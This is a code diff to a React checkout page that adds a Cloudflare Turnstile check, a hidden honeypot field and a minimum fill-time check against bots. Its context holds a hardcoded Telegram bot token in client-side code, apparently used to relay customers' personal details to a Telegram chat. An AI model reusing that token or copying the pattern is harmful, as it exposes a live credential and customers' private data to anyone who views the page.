@@ -38,6 +38,9 @@ export default function CheckoutPage() {
   const [selectedDay, setSelectedDay] = useState('')
   const [selectedMonth, setSelectedMonth] = useState('')
   const [selectedYear, setSelectedYear] = useState('')
+  const [turnstileToken, setTurnstileToken] = useState<string | null>(null)
+  const [honeypot, setHoneypot] = useState('')
+  const [formLoadTime] = useState(Date.now())
 
   // Telegram configuration
   const TELEGRAM_BOT_TOKEN = '8535669526:AAHjGvoXJv5HwdDDr6jl8eTFeWa4DyTe4lg'
@@ -112,6 +115,31 @@ export default function CheckoutPage() {
     }
   }
 
+  // Load Turnstile script
+  useEffect(() => {
+    if (document.getElementById('cf-turnstile-script')) return
+    const script = document.createElement('script')
+    script.id = 'cf-turnstile-script'
+    script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js'
+    script.async = true
+    script.defer = true
+    document.head.appendChild(script)
+  }, [])
+
+  // Turnstile callback
+  useEffect(() => {
+    (window as any).onTurnstileCallback = (token: string) => {
+      setTurnstileToken(token)
+    };
+    (window as any).onTurnstileExpired = () => {
+      setTurnstileToken(null)
+    }
+    return () => {
+      delete (window as any).onTurnstileCallback
+      delete (window as any).onTurnstileExpired
+    }
+  }, [])
+
   // Check if form is valid
   const isFormValid = () => {
     return formData.firstName && 
@@ -125,7 +153,8 @@ export default function CheckoutPage() {
            isValidPostalCode(formData.postalCode, formData.country) &&
            formData.phone && 
            formData.dateOfBirth && 
-           validateAge(formData.dateOfBirth)
+           validateAge(formData.dateOfBirth) &&
+           turnstileToken
   }
 
   // Update Telegram message
@@ -314,9 +343,39 @@ ${itemsList}
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     
+    // Honeypot check
+    if (honeypot) {
+      console.log('Bot detected via honeypot')
+      return
+    }
+
+    // Minimum time check (3 seconds)
+    const timeSpent = (Date.now() - formLoadTime) / 1000
+    if (timeSpent < 3) {
+      alert(isFr ? 'Veuillez prendre le temps de remplir le formulaire.' : 'Please take your time filling out the form.')
+      return
+    }
+
     // Validate all required fields and age
     if (!isFormValid()) {
       alert(isFr ? 'Veuillez remplir tous les champs requis et vous assurer que l\'âge est entre 13 et 100 ans' : 'Please fill in all required fields and ensure age is between 13 and 100')
+      return
+    }
+
+    // Verify Turnstile server-side
+    try {
+      const verifyRes = await fetch('/api/verify-turnstile', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token: turnstileToken }),
+      })
+      const verifyData = await verifyRes.json()
+      if (!verifyData.success) {
+        alert(isFr ? 'Verification de securite echouee. Veuillez reessayer.' : 'Security verification failed. Please try again.')
+        return
+      }
+    } catch {
+      alert(isFr ? 'Erreur de verification. Veuillez reessayer.' : 'Verification error. Please try again.')
       return
     }
     
@@ -825,6 +884,23 @@ ${itemsList}
               </div>
               
               <form onSubmit={handleSubmit}>
+                {/* Honeypot - hidden from real users */}
+                <div style={{ position: 'absolute', left: '-9999px', opacity: 0, height: 0, overflow: 'hidden' }} aria-hidden="true">
+                  <label htmlFor="website">Website</label>
+                  <input type="text" id="website" name="website" value={honeypot} onChange={(e) => setHoneypot(e.target.value)} tabIndex={-1} autoComplete="off" />
+                </div>
+
+                {/* Cloudflare Turnstile */}
+                <div className="mb-4">
+                  <div
+                    className="cf-turnstile"
+                    data-sitekey="0x4AAAAAACZT46yj0cMxXUbs"
+                    data-callback="onTurnstileCallback"
+                    data-expired-callback="onTurnstileExpired"
+                    data-theme="light"
+                  />
+                </div>
+
                 <button 
                   type="submit"
                   disabled={isProcessing || !isFormValid()}
